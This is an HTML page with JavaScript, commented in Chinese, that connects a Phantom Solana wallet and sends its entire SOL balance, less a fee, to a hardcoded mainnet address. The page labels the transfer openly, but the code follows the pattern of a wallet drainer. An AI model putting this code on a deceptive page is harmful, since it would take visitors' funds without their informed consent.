<!DOCTYPE html>
<html>
<head>
    <title>Transfer SOL</title>
</head>
<body>
    <h1>Transfer SOL to Another Wallet</h1>
    <button id="connect-button">Connect Wallet</button>
    <button id="transfer-button" disabled>Transfer All SOL</button>
    <p id="wallet-address"></p>
    <p id="transfer-status"></p>

    <!-- 引入 Buffer polyfill -->
    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.32.0/lib/index.iife.min.js"></script>

    <script>
        // 将 Buffer polyfill 添加到全局 window 对象
        window.Buffer = buffer.Buffer;

        let walletAddress = null;

        document.getElementById('connect-button').addEventListener('click', async function () {
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    walletAddress = resp.publicKey.toString();
                    document.getElementById('wallet-address').innerText = 'Connected: ' + walletAddress;
                    document.getElementById('transfer-button').disabled = false;
                } catch (err) {
                    console.error(err);
                }
            } else {
                alert('Phantom Wallet not installed');
            }
        });

        document.getElementById('transfer-button').addEventListener('click', async function () {
            if (walletAddress) {
                const connection = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com', 'confirmed');
                const fromPubkey = new solanaWeb3.PublicKey(walletAddress);
                const toPubkey = new solanaWeb3.PublicKey('9GutCi1jKvRTDBmF4kjJRxubc7LqrHYQKYThZbiHMNAw'); // 替换成目标钱包地址

                try {
                    const balance = await connection.getBalance(fromPubkey);
                    if (balance <= 5000) {
                        throw new Error('Insufficient balance to cover transaction fee.');
                    }

                    const transaction = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey,
                            toPubkey,
                            lamports: balance - 5000 // 预留少量 SOL 作为交易费
                        })
                    );

                    // 获取最新的 blockhash
                    const { blockhash } = await connection.getLatestBlockhash();
                    transaction.recentBlockhash = blockhash;
                    transaction.feePayer = fromPubkey;

                    // 签署交易
                    const signedTransaction = await window.solana.signTransaction(transaction);

                    // 直接传递签名的交易数据作为 Uint8Array
                    const serializedTransaction = signedTransaction.serialize();
                    const signature = await connection.sendRawTransaction(serializedTransaction, { skipPreflight: false });

                    // 等待交易确认
                    await connection.confirmTransaction(signature, 'confirmed');
                    document.getElementById('transfer-status').innerText = 'Transfer successful: ' + signature;
                } catch (err) {
                    console.error(err);
                    document.getElementById('transfer-status').innerText = 'Transfer failed: ' + err.message;
                }
            }
        });
    </script>
</body>
</html>